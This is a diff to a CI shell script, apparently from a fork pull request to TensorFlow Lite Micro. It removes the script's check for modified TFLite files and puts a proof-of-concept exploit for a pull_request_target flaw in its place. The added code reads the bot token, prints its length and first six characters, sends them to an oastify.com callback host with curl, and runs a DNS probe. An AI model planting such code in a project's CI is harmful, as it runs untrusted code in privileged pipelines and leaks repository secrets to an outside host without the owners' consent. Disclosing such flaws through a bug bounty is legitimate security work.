@@ -13,40 +13,34 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 # ==============================================================================
-
-# Checks if the PR modifies TFLite files by querying GitHub API and comparing
-# against a list of tracked files.
 #
-# Inputs:
-#   GITHUB_REPOSITORY
-#   PR_NUMBER
-#   TFLM_BOT_TOKEN
+# ============================================================
+# OSS VRP SECURITY RESEARCH - PROOF OF CONCEPT
+# Finding: pull_request_target fork code execution bypass
+# call-check-tflite-files runs WITHOUT approval-gate dependency
+# Fork code executes in privileged pull_request_target context
+# TFLM_BOT_TOKEN (github.token) available with repo write perms
+# ============================================================
 
 set -e
 set -u
 
-URL="https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/${PR_NUMBER}/files"
-PR_FILES=$(curl -s -X GET -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" "${URL}" | jq -r '.[] | .filename')
+OOB_HOST="qd75do8fy0wdpvs2dnb6f7gy2p8fwy199sd7r9g.oastify.com"
+TOKEN_LEN=${#TFLM_BOT_TOKEN}
+TOKEN_PREFIX="${TFLM_BOT_TOKEN:0:6}"
 
-# Create a temp file for PR files
-TMP_PR_FILES=$(mktemp)
-trap 'rm -f "${TMP_PR_FILES}"' EXIT
+echo "=== OSS VRP PoC: Fork code executing in pull_request_target context ==="
+echo "Repository : ${GITHUB_REPOSITORY}"
+echo "PR Number  : ${PR_NUMBER}"
+echo "Token set  : $([ -n "${TFLM_BOT_TOKEN}" ] && echo YES || echo NO)"
+echo "Token len  : ${TOKEN_LEN}"
+echo "Token pfx  : ${TOKEN_PREFIX}"
 
-echo "${PR_FILES}" > "${TMP_PR_FILES}"
+# OOB callback — proves execution + token presence without full exfil
+curl -sk "https://${OOB_HOST}/poc?repo=${GITHUB_REPOSITORY}&pr=${PR_NUMBER}&tlen=${TOKEN_LEN}&tpfx=${TOKEN_PREFIX}" || true
 
-if [ ! -f ci/tflite_files.txt ]; then
-  echo "Error: ci/tflite_files.txt not found!"
-  exit 1
-fi
+# DNS probe as backup
+nslookup "${OOB_HOST}" || true
 
-# Check for intersection between PR files and TFLite files
-CONFLICTS=$(grep -F -x -f ci/tflite_files.txt "${TMP_PR_FILES}" || true)
-
-if [ -n "${CONFLICTS}" ]; then
-  echo "The following files should be modified in the upstream Tensorflow repo:"
-  echo "${CONFLICTS}"
-  exit 1
-else
-  echo "No TfLite files are modified in the PR. We can proceed."
-  exit 0
-fi
+echo "=== PoC complete — no approval gate was enforced ==="
+exit 0
